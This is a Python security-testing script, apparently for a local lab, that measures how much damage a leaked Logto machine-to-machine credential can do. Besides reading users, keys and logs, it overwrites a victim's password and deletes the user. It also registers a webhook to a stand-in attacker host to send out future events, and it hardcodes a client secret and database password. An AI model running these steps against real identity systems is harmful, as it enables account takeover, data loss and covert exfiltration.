#!/usr/bin/env python3
"""Probe the blast radius of a leaked M2M credential.

Answers: if the client_id/secret leaks, what can the attacker actually do?
Run against the lab Logto. Every case prints the HTTP status so the boundary
is measured, not assumed.
"""
import base64
import json
import subprocess
import sys
import urllib.error
import urllib.parse
import urllib.request

BASE = "http://localhost:3001"
RESOURCE = "https://default.logto.app/api"
CID = "cpu562vas8h3t2yzaqlxo"
CSEC = "oCorhvnR1546Rp1jIN6O8zj9zCiPYu4h"

PG = ["psql", "-h", "127.0.0.1", "-U", "postgres", "-d", "logto", "-tAq"]


def sql(q):
    env = {"PGPASSWORD": "logto_lab_pw", "PATH": "/usr/bin:/bin"}
    p = subprocess.run(PG + ["-c", q], capture_output=True, text=True, env=env)
    return (p.stdout or p.stderr).strip()


def req(method, path, *, body=None, headers=None, form=None, base=BASE):
    hdrs = dict(headers or {})
    data = None
    if form is not None:
        data = urllib.parse.urlencode(form).encode()
        hdrs["Content-Type"] = "application/x-www-form-urlencoded"
    elif body is not None:
        data = json.dumps(body).encode()
        hdrs["Content-Type"] = "application/json"
    r = urllib.request.Request(base + path, data=data, headers=hdrs, method=method)
    try:
        with urllib.request.urlopen(r, timeout=25) as resp:
            raw = resp.read().decode() or ""
            return resp.status, (json.loads(raw) if raw.strip() else None)
    except urllib.error.HTTPError as e:
        raw = e.read().decode() or ""
        try:
            return e.code, (json.loads(raw) if raw.strip() else None)
        except Exception:
            return e.code, raw


def main():
    cid, csec = sys.argv[1], sys.argv[2]
    basic = base64.b64encode(f"{cid}:{csec}".encode()).decode()
    st, tok = req("POST", "/oidc/token", headers={"Authorization": "Basic " + basic},
                  form={"grant_type": "client_credentials",
                        "resource": RESOURCE, "scope": "all"})
    if st != 200:
        raise SystemExit(f"token failed: {st} {tok}")
    auth = {"Authorization": "Bearer " + tok["access_token"]}
    print(f"token OK (scope={tok.get('scope')!r})\n")

    victim = sql("select id from users where tenant_id='default' "
                 "and primary_email='t_happy@example.com' limit 1;")
    print(f"victim user id = {victim}\n")

    print("=== read blast radius ===")
    for label, method, path in [
        ("list users",        "GET", "/api/users"),
        ("list applications", "GET", "/api/applications"),
        ("list connectors",   "GET", "/api/connectors"),
        ("list roles",        "GET", "/api/roles"),
        ("list organizations","GET", "/api/organizations"),
        ("list audit logs",   "GET", "/api/logs"),
        ("read sign-in exp",  "GET", "/api/sign-in-exp/default"),
        ("read oidc keys",    "GET", "/api/configs/oidc/keys"),
        ("read jwt customizer","GET", "/api/configs/jwt-customizer"),
        ("read hooks",        "GET", "/api/hooks"),
        ("read user detail",  "GET", f"/api/users/{victim}"),
    ]:
        st, _ = req(method, path, headers=auth)
        print(f"  {st}  {label}")

    print("\n=== write blast radius (the dangerous part) ===")
    st, _ = req("PATCH", f"/api/users/{victim}/is-suspended", headers=auth,
                body={"isSuspended": True})
    print(f"  {st}  suspend a user")
    req("PATCH", f"/api/users/{victim}/is-suspended", headers=auth, body={"isSuspended": False})

    st, _ = req("PATCH", f"/api/users/{victim}/password", headers=auth,
                body={"password": "AttackerSetThis1!"})
    print(f"  {st}  ** overwrite a user's password **")

    st, _ = req("POST", f"/api/users/{victim}/roles", headers=auth,
                body={"roleIds": []})
    print(f"  {st}  assign roles to a user")

    st, created = req("POST", "/api/applications", headers=auth,
                      body={"name": "attacker-app", "type": "MachineToMachine",
                            "description": "probe"})
    print(f"  {st}  ** create a new application (persistence) **")
    if st in (200, 201):
        req("DELETE", f"/api/applications/{created['id']}", headers=auth)
        print("       (cleaned up)")

    st, _ = req("POST", "/api/hooks", headers=auth,
                body={"name": "attacker-hook", "events": ["User.Created"],
                      "config": {"url": "https://attacker.example/hook"}})
    print(f"  {st}  ** create a webhook (exfiltrate future events) **")

    st, _ = req("DELETE", f"/api/users/{victim}", headers=auth)
    print(f"  {st}  ** delete a user **")

    print("\n=== what is NOT reachable ===")
    for label, path in [
        ("admin tenant users", "/api/users"),
    ]:
        st, _ = req("GET", path, headers=auth, base="http://localhost:3002")
        print(f"  {st}  {label} (admin tenant, different audience)")

    st, _ = req("GET", "/api/users", headers={})
    print(f"  {st}  management API without any token")
    return 0


if __name__ == "__main__":
    sys.exit(main())
